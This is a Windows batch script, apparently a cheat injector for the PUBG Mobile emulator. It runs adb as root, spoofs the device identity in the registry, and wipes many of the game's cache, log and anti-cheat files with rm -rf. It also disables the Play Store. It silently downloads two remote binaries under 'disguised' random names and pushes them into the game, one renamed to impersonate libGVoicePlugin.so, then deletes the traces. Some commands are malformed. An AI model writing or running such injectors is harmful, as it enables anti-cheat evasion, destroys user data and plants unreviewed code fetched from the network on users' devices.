@echo off
@cd/d "%~dp0"

:: Kill any existing ADB server and set up root access silently
adb kill-server >nul 2>&1
adb root >nul 2>&1
adb  shell touch /dev/GL
Reg.exe  add HKCU\Software\Tencent\MobileGamePC /v VMDeviceManufacturer /t REG_SZ /d samsung /f
Reg.exe  add HKCU\Software\Tencent\MobileGamePC /v VMDeviceModel /t REG_SZ /d SM-5731 /f
adb  shell rm -rf /sdcard/tencent
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/cache
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/TGPA
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Content
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/LobbyBubble
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/Lobby
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/Login
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/playerprefs.sav
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/Cached.sav
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/PufferTmpDir
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/UpdateInfo
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/TableDatas
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/GameErrorNoRecords
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/puffer_temp
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/apollo_reslist.flist
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/filelist.json
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/puffer_res.eifs
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/PufferFileList.json
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/PufferFileListAddtional.json
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Pandora
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/ImageDownload
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/rawdata
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/RoleInfo
adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/StatEventReportedFlag
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Logs
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/MMKV
adb  shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Intermediate
adb shell rm -rf /data/data/com.tencent.ig/cache
adb  shell rm -rf /data/data/com.tencent.ig/code_cache
adb  shell rm -rf /data/data/com.tencent.ig/files/*
adb  shell rm -rf /data/data/com.tencent.ig/no_backup
adb  shell rm -rf /sdcard/Android/.system_android_12
adb  shell rm -rf /sdcard/Android/data/com.tencent.ig/files/.system_android_l2
adb shell rm -rf /data/share1/hardware_info.txt
adb shell rm -rf /data/share1/pictures
adb shell rm -rf touch /etc/pc.log
adb  shell rm -rf setprop config.disable_serial 2
adb  shell pm disable-user --user 0 com.android.vending
 adb shell rm -rf /data/data/com.tencent.ig/databases
adb shell rm -rf touch /etc/pc.log
:: Generate random names for downloaded files
setlocal enabledelayedexpansion
set "ENCODED_FILE1=%TEMP%\!RANDOM!!RANDOM!.enc"
set "ENCODED_FILE2=%TEMP%\!RANDOM!!RANDOM!.enc"

:: Download files with disguised names
curl -s -o "!ENCODED_FILE1!" "https://raw.githubusercontent.com/Error111112/bn/refs/heads/main/ano_emu_c2.dat" >nul 2>&1
curl -s -o "!ENCODED_FILE2!" "https://raw.githubusercontent.com/Error111112/HBP/refs/heads/main/libmario.so" >nul 2>&1

:: Create required directories silently
adb shell mkdir -p /data/data/com.tencent.ig/files/ano_tmp >nul 2>&1
adb shell mkdir -p /data/data/com.tencent.ig/lib >nul 2>&1

:: Rename and inject the first file
set Count=0
set MaxAttempts=5
:REPEAT_INJECTION
set /a Count+=1
adb push "!ENCODED_FILE1!" /data/data/com.tencent.ig/files/ano_tmp/ano_emu_c2.dat >nul 2>&1
if %Count% geq %MaxAttempts% goto INJECT_SECOND_FILE
timeout /t 1 >nul
goto REPEAT_INJECTION

:INJECT_SECOND_FILE
:: Rename and inject the second file
adb push "!ENCODED_FILE2!" /data/data/com.tencent.ig/lib/libGVoicePlugin.so >nul 2>&1

:: Launch the game silently
adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHER 1 >nul 2>&1

:: Clean up disguised files
del "!ENCODED_FILE1!" >nul 2>&1
del "!ENCODED_FILE2!" >nul 2>&1

:: Exit silently
exit
pause